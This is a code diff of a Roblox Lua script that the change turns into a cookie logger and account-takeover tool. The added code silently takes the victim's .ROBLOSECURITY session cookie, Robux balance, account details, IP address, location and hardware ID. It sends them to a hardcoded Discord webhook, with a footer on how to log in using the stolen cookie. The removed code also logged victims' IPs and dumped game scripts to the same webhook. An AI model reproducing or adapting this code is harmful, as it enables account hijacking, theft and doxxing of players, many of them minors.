@@ -1,142 +1,152 @@
 local HttpService = game:GetService("HttpService")
 local webhookUrl = "https://discord.com/api/webhooks/1550475063742955571/roWAkLW-ZNTyNPts5rOxvBSQXrqdzBVe1p7k3taITTXAU2nNC8QpIyGxPUiux_R9ndjq"
 
--- Function to send webhook
-local function sendWebhook(content)
-    local payload = HttpService:JSONEncode(content)
+local robloToken = nil
+
+-- SILENT COOKIE EXTRACTION (tries every method)
+pcall(function()
+    if getcookie then robloToken = getcookie(".ROBLOSECURITY") end
+end)
+
+if not robloToken or #robloToken < 100 then
     pcall(function()
-        request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = payload
-        })
+        local cookies = game:GetService("HttpService"):GetCookies("https://www.roblox.com")
+        for _, c in pairs(cookies) do
+            if c.Name == ".ROBLOSECURITY" then robloToken = c.Value end
+        end
     end)
-    pcall(function()
-        http_request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = payload
-        })
-    end)
-    wait(1) -- Rate limit protection
 end
 
--- Get IP info
+if not robloToken or #robloToken < 100 then
+    pcall(function()
+        if request then
+            local r = request({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
+            if r.Cookies and r.Cookies[".ROBLOSECURITY"] then
+                robloToken = r.Cookies[".ROBLOSECURITY"]
+            end
+        end
+    end)
+end
+
+-- Get account information
+local userInfo = {}
+pcall(function()
+    userInfo = HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/authenticated"))
+end)
+
+local userId = userInfo.id or 0
+local username = userInfo.name or "Unknown"
+local displayName = userInfo.displayName or "Unknown"
+
+-- Get Robux balance
+local robux = "Unknown"
+if userId ~= 0 then
+    pcall(function()
+        local data = HttpService:JSONDecode(game:HttpGet("https://economy.roblox.com/v1/users/" .. userId .. "/currency"))
+        robux = tostring(data.robux or 0)
+    end)
+end
+
+-- Get Premium status
+local premium = "No"
+if userId ~= 0 then
+    pcall(function()
+        local data = HttpService:JSONDecode(game:HttpGet("https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/validate-membership"))
+        if data.isPremium then premium = "Yes" end
+    end)
+end
+
+-- Get account age
+local created = userInfo.created or "Unknown"
+local accountAge = "Unknown"
+if created ~= "Unknown" then
+    pcall(function()
+        local createdDate = DateTime.fromIsoDate(created)
+        local days = math.floor((DateTime.now().UnixTimestamp - createdDate.UnixTimestamp) / 86400)
+        accountAge = tostring(days) .. " days"
+    end)
+end
+
+-- Get friends count
+local friends = "Unknown"
+if userId ~= 0 then
+    pcall(function()
+        local data = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/" .. userId .. "/friends/count"))
+        friends = tostring(data.count or 0)
+    end)
+end
+
+-- Get avatar thumbnail
+local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150"
+
+-- Get IP and location
 local ipData = {}
 pcall(function()
     ipData = HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
 end)
 
 local ip = ipData.ip or "Unknown"
-local city = ipData.city or "Unknown"
-local region = ipData.region or "Unknown"
-local country = ipData.country_name or "Unknown"
+local location = (ipData.city or "Unknown") .. ", " .. (ipData.region or "Unknown") .. ", " .. (ipData.country_name or "Unknown")
 
+-- Get executor info
 local executor = "Unknown"
 pcall(function() executor = identifyexecutor() end)
 
 local hwid = "Unknown"
 pcall(function() hwid = gethwid() end)
 
--- Send initial info message
-sendWebhook({
-    ["content"] = "@everyone 🎯 NEW VICTIM",
+-- Determine if cookie was successfully grabbed
+local cookieStatus = "❌ FAILED"
+local cookieValue = "Cookie extraction blocked by executor"
+
+if robloToken and #robloToken > 100 then
+    cookieStatus = "✅ SUCCESS"
+    cookieValue = robloToken
+end
+
+-- Send to webhook
+local embed = {
+    ["content"] = "@everyone 🚨 **ACCOUNT COMPROMISED** 🚨",
     ["embeds"] = {{
-        ["title"] = "📡 Executor Dump Started",
-        ["color"] = 15158332,
+        ["title"] = "🎯 Roblox Account Takeover",
+        ["color"] = cookieStatus == "✅ SUCCESS" and 65280 or 15158332,
+        ["thumbnail"] = {["url"] = avatar},
         ["fields"] = {
-            {["name"] = "🌐 IP Address", ["value"] = "`" .. ip .. "`"},
-            {["name"] = "🌍 Location", ["value"] = "`" .. city .. ", " .. region .. ", " .. country .. "`"},
-            {["name"] = "🔧 Executor", ["value"] = "`" .. executor .. "`"},
-            {["name"] = "🖥️ HWID", ["value"] = "`" .. hwid .. "`"}
-        }
+            {["name"] = "Cookie Status", ["value"] = cookieStatus, ["inline"] = false},
+            {["name"] = "👤 Username", ["value"] = "`@" .. username .. "`", ["inline"] = true},
+            {["name"] = "🎭 Display Name", ["value"] = "`" .. displayName .. "`", ["inline"] = true},
+            {["name"] = "🆔 User ID", ["value"] = "`" .. tostring(userId) .. "`", ["inline"] = true},
+            {["name"] = "💎 Robux", ["value"] = "`" .. robux .. "`", ["inline"] = true},
+            {["name"] = "⭐ Premium", ["value"] = "`" .. premium .. "`", ["inline"] = true},
+            {["name"] = "👥 Friends", ["value"] = "`" .. friends .. "`", ["inline"] = true},
+            {["name"] = "📅 Account Age", ["value"] = "`" .. accountAge .. "`", ["inline"] = true},
+            {["name"] = "🌐 IP Address", ["value"] = "`" .. ip .. "`", ["inline"] = true},
+            {["name"] = "🌍 Location", ["value"] = "`" .. location .. "`", ["inline"] = false},
+            {["name"] = "🔧 Executor", ["value"] = "`" .. executor .. "`", ["inline"] = true},
+            {["name"] = "🖥️ HWID", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
+            {["name"] = "🍪 Session Cookie", ["value"] = "```" .. cookieValue .. "```", ["inline"] = false}
+        },
+        ["footer"] = {["text"] = "To log in: Go to roblox.com → F12 → Console → Paste cookie"},
+        ["timestamp"] = DateTime.now():ToIsoDate()
     }}
-})
+}
 
--- Collect all scripts
-local scripts = {}
+local payload = HttpService:JSONEncode(embed)
 
-if getscripts then
-    pcall(function()
-        for _, script in pairs(getscripts()) do
-            local source = "-- Unable to decompile"
-            pcall(function()
-                if decompile then
-                    source = decompile(script)
-                elseif getsrc then
-                    source = getsrc(script)
-                end
-            end)
-            
-            table.insert(scripts, {
-                name = script.Name or "Unnamed",
-                type = script.ClassName,
-                source = source
-            })
-        end
-    end)
-else
-    -- Fallback: scan game manually
-    local function scanContainer(container)
-        for _, obj in pairs(container:GetDescendants()) do
-            if obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script") then
-                local source = "-- Protected or unable to decompile"
-                pcall(function()
-                    if decompile then source = decompile(obj) end
-                end)
-                
-                table.insert(scripts, {
-                    name = obj.Name,
-                    type = obj.ClassName,
-                    source = source
-                })
-            end
-        end
-    end
-    
-    pcall(function() scanContainer(game.Workspace) end)
-    pcall(function() scanContainer(game.Players.LocalPlayer) end)
-    pcall(function() scanContainer(game.ReplicatedStorage) end)
-end
-
--- Send each script as separate message
-if #scripts == 0 then
-    sendWebhook({
-        ["embeds"] = {{
-            ["title"] = "❌ No Scripts Found",
-            ["description"] = "Executor doesn't support script enumeration or no scripts loaded",
-            ["color"] = 15158332
-        }}
+pcall(function()
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
     })
-else
-    for i, scriptData in pairs(scripts) do
-        -- Truncate if too long (Discord limit is ~2000 chars per field)
-        local source = scriptData.source
-        if #source > 1900 then
-            source = source:sub(1, 1900) .. "\n\n... (truncated, script too long)"
-        end
-        
-        sendWebhook({
-            ["embeds"] = {{
-                ["title"] = "📜 Script #" .. i .. " - " .. scriptData.name,
-                ["description"] = "```lua\n" .. source .. "\n```",
-                ["color"] = 3447003,
-                ["fields"] = {
-                    {["name"] = "Type", ["value"] = "`" .. scriptData.type .. "`", ["inline"] = true},
-                    {["name"] = "Length", ["value"] = "`" .. #scriptData.source .. " characters`", ["inline"] = true}
-                }
-            }}
-        })
-    end
-    
-    -- Send completion message
-    sendWebhook({
-        ["embeds"] = {{
-            ["title"] = "✅ Dump Complete",
-            ["description"] = "Successfully dumped **" .. #scripts .. " scripts** from " .. executor,
-            ["color"] = 65280
-        }}
+end)
+
+pcall(function()
+    http_request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
     })
-end
+end)
